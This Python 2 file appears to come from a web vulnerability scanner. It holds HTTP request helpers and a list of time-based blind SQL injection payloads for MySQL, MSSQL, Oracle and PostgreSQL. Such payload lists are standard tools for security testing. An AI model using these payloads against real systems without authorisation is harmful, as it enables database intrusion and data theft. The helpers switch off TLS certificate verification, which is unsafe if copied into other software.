#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests
import requests.packages.urllib3
import time
requests.packages.urllib3.disable_warnings()

def http_request_post(url, payload, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
                        'Connection': 'Close'
                      }
        time0 = time.time()
        result = requests.post(url, 
            data=payload, 
            headers=headers, 
            stream=body_content_workflow, 
            timeout=timeout, 
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        time1 = time.time()
        if time_check:
            return result.status_code, result.headers, result.content, time1-time0
        return result.status_code, result.headers, result.content
    except Exception, e:
        if time_check:
            return -1, {}, '', 999
        return -1, {}, ''

def http_request_get(url, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
                        'Connection': 'Close'
                      }
        time0 = time.time()
        result = requests.get(url,
            headers=headers,
            stream=body_content_workflow,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        time1 = time.time()
        if time_check:
            return result.status_code, result.headers, result.content, time1-time0
        return result.status_code, result.headers, result.content
    except Exception, e:
        if time_check:
            return -1, {}, '', 999
        return -1, {}, ''

def get_headers(url, method, data, headers, proxy_headers=None):
    try:
        cookie = headers.get('cookie')
        referer = headers.get('referer')
        useragent = headers.get('useragent')
        if not useragent:
            useragent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36'
        if not referer:
            referer = url
        headers = {
                    'User-Agent': useragent,
                    'Connection': 'Close',
                    'Cookie': cookie,
                    'Referer': referer
                  }
        if proxy_headers != None:
            headers = proxy_headers
        if 'Content-Length' in headers:
            del headers['Content-Length']
        return headers
    except:
        return {}

def cookie_filter(key):
    keys = ['__utm', 'PHPSESSID', 'JSESSIONID', 'ASPSESSION', 'ASP.NET_SessionId', 'Hm_l', '_ga']
    for line in keys:
        if line in key:
            return False
    return True

def sqli_time_payloads():
    payloads = [
                    ' AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO)',
                    "' AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO) AND '22'='22",
                    ') AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO) AND (22=22',
                    "') AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO) AND ('22'='22",
                    "%' AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO) AND '%'='",
                    " AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO)-- -",
                    ",(SELECT*FROM(SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO)",
                    ",(SELECT*FROM(SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO)as1",
                    "\xbf' AND (SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))zpGO)-- -",

                    " WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'",
                    "' WAITFOR DELAY '0:0:XXXTIMESLEEPXXX' AND '22'='22",
                    ") WAITFOR DELAY '0:0:XXXTIMESLEEPXXX' AND (2=2",
                    "') WAITFOR DELAY '0:0:XXXTIMESLEEPXXX' AND ('22'='22",
                    "%' WAITFOR DELAY '0:0:XXXTIMESLEEPXXX' AND '%'='",
                    " WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'-- -",

                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX)",
                    "' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX) AND '22'='22",
                    ") AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX) AND (22=22",
                    "') AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX) AND ('22'='22",
                    "%' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX) AND '%'='",
                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),XXXTIMESLEEPXXX)-- -",

                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX))",
                    "' AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX)) AND '22'='22",
                    ") AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX)) AND (22=22",
                    "') AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX)) AND ('22'='22",
                    "%' AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX)) AND '%'='",
                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(XXXTIMESLEEPXXX))-- -",

                    ";(SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))IiMY)-- -",
                    "';(SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))IiMY)-- -",
                    ");(SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))IiMY)-- -",
                    "');(SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))IiMY)-- -",
                    "%';(SELECT * FROM (SELECT(SLEEP(XXXTIMESLEEPXXX)))IiMY)-- -",

                    ";WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'--",
                    "';WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'--",
                    ");WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'--",
                    "');WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'--",
                    "%';WAITFOR DELAY '0:0:XXXTIMESLEEPXXX'--",

                    ";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),XXXTIMESLEEPXXX) FROM DUAL--",
                    "';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),XXXTIMESLEEPXXX) FROM DUAL--",
                    ");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),XXXTIMESLEEPXXX) FROM DUAL--",
                    "');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),XXXTIMESLEEPXXX) FROM DUAL--",
                    "%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),XXXTIMESLEEPXXX) FROM DUAL--",

                    ";SELECT PG_SLEEP(XXXTIMESLEEPXXX)--",
                    "';SELECT PG_SLEEP(XXXTIMESLEEPXXX)--",
                    ");SELECT PG_SLEEP(XXXTIMESLEEPXXX)--",
                    "');SELECT PG_SLEEP(XXXTIMESLEEPXXX)--",
                    "%';SELECT PG_SLEEP(XXXTIMESLEEPXXX)--",
               ]
    return payloads


